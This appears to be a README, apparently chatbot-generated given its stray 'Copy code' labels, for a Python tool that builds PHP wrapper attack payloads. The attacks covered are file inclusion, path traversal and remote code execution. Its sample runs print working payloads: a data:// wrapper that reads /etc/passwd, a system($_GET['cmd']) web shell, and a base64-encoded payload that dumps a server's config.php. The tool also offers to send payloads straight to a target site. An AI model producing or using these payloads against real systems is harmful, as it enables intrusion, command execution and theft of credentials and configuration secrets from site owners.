## PHP Data Exfiltration Automation Tool

## Overview
This is an advanced penetration testing tool for automating the discovery and exploitation of PHP data exfiltration vulnerabilities in web applications. It allows ethical hackers and security researchers to efficiently test for issues like local file inclusion, remote code execution, path traversal etc.

The tool is written in Python and works on Linux platforms. It has an intuitive text-based interface to guide the user through generating optimized payloads for injection testing.
Installation

The tool can be installed on Linux using pip:

bash

Copy code
pip install php-exfiltrate

Or by cloning the GitHub repository:

bash

```
Copy code
git clone https://github.com/ethicalhacker/php-exfiltrate
cd php-exfiltrate
```
## Usage

# To start the tool, simply run:

```
Copy code
python php-exfiltrate.py

```
This will present an interactive menu-driven interface to configure payload options.

The key steps are:

    Select the writing model (data://, php://filter etc.)
    Choose a mime-type for the data (text/plain, application/x-php etc.)
    Pick a built-in payload (file_get_contents, system command execution etc.)
    Set payload parameters like filenames, commands etc.
    The tool constructs and displays the complete payload
    Option to directly test the payload on a target site

Payloads

The tool contains the following well-commented payloads spanning multiple exfiltration techniques:

    File Inclusion - Extract arbitrary files from the system
    Code Execution - Execute OS commands via backdoors like system()
    File Reads - Exfiltrate sensitive data like config files
    Path Traversal - Access files outside web directories
    Source Code Disclosure - Dump source code of application pages
    Protocol Bypasses - Use obscure data types to bypass whitelist
    PHP Wrapper Tests - Check for misconfigurations in wrappers like php://input

Users can also easily add custom payloads to the existing codebase.
Sample Runs

Here are some sample runs showing practical usage:
LFI Payload with /etc/passwd

Copy code
python php-exfiltrate.py

Select model > 2. data://
Choose data type > 1. text/plain
Select payload > 4. file inclusion 
Enter filename > /etc/passwd

Generated payload:

data://text/plain,<?php echo file_get_contents('/etc/passwd');?>

Get OS Shell with System Execution

Copy code
python php-exfiltrate.py

Select model > 1. data:
Choose data type > 2. application/x-php
Select payload > 2. system execution
Append command > &cmd=ls -la

Generated payload:  

data:application/x-php,<?php system($_GET['cmd']);?>&cmd=ls -la

Exfiltrate PHP Config in Base64 Format

Copy code
python php-exfiltrate.py

Select model > 2. data://  
Choose data type > 1. text/plain
Select payload > 8. base64 file read
Enter filename > /var/www/config.php

Generated payload:

data://text/plain;base64,PD9waHAgZWNobyBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCcvdmFyL3d3dy9jb25maWcucGhwJykpOz8+

This provides an overview of the key capabilities of the tool. It simplifies and automates the manual process of PHP penetration testing and vulnerability discovery. The modular design allows rapid enhancements as well.
